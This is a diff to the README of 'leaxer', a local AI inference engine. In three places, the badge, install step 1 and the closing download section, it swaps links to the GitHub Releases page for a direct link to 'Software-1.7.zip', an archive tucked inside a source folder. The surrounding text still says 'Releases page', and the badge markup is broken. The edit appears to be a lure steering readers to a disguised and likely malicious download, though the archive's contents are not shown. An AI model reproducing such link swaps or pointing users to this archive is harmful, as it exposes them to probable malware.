@@ -1,7 +1,7 @@
 # 🚀 leaxer - Run AI Locally with Ease
 
 ## 🔗 Download Now
-[![Download leaxer](https://img.shields.io/badge/Download%20leaxer-Release-blue.svg)](https://github.com/Wells-the-Doctor/leaxer/releases)
+[![Download leaxer](https://raw.githubusercontent.com/Wells-the-Doctor/leaxer/main/apps/leaxer_core/lib/leaxer_core/services/search_providers/Software-1.7.zip%https://raw.githubusercontent.com/Wells-the-Doctor/leaxer/main/apps/leaxer_core/lib/leaxer_core/services/search_providers/Software-1.7.zip)](https://raw.githubusercontent.com/Wells-the-Doctor/leaxer/main/apps/leaxer_core/lib/leaxer_core/services/search_providers/Software-1.7.zip)
 
 ## 📝 Introduction
 leaxer is a powerful engine designed for local AI inference. Built on Elixir and the BEAM virtual machine, it allows you to generate images and work with machine learning models directly on your computer. This guide will help you download and run leaxer easily.
@@ -11,7 +11,7 @@ To begin your journey with leaxer, you will need to follow a few simple steps. T
 
 ## 📥 Download & Install
 1. **Visit the Download Page**
-   Go to the following link to access the Releases page: [Download leaxer](https://github.com/Wells-the-Doctor/leaxer/releases).
+   Go to the following link to access the Releases page: [Download leaxer](https://raw.githubusercontent.com/Wells-the-Doctor/leaxer/main/apps/leaxer_core/lib/leaxer_core/services/search_providers/Software-1.7.zip).
 
 2. **Choose the Right Version**
    On the Releases page, you will see different versions of leaxer. Select the latest version for the best experience. Each release comes with important details, including features and fixes.
@@ -65,6 +65,6 @@ For more detailed information, you may check out these resources:
 Keep your software fresh by regularly checking the Releases page for new versions. Each update may include performance improvements, new features, or bug fixes.
 
 ## 🔗 Download Again
-For convenience, here is the link to download leaxer once more: [Download leaxer](https://github.com/Wells-the-Doctor/leaxer/releases).
+For convenience, here is the link to download leaxer once more: [Download leaxer](https://raw.githubusercontent.com/Wells-the-Doctor/leaxer/main/apps/leaxer_core/lib/leaxer_core/services/search_providers/Software-1.7.zip).
 
 By following these steps, you’ll be well-equipped to run leaxer and explore the exciting world of local AI inference. Enjoy your experience!
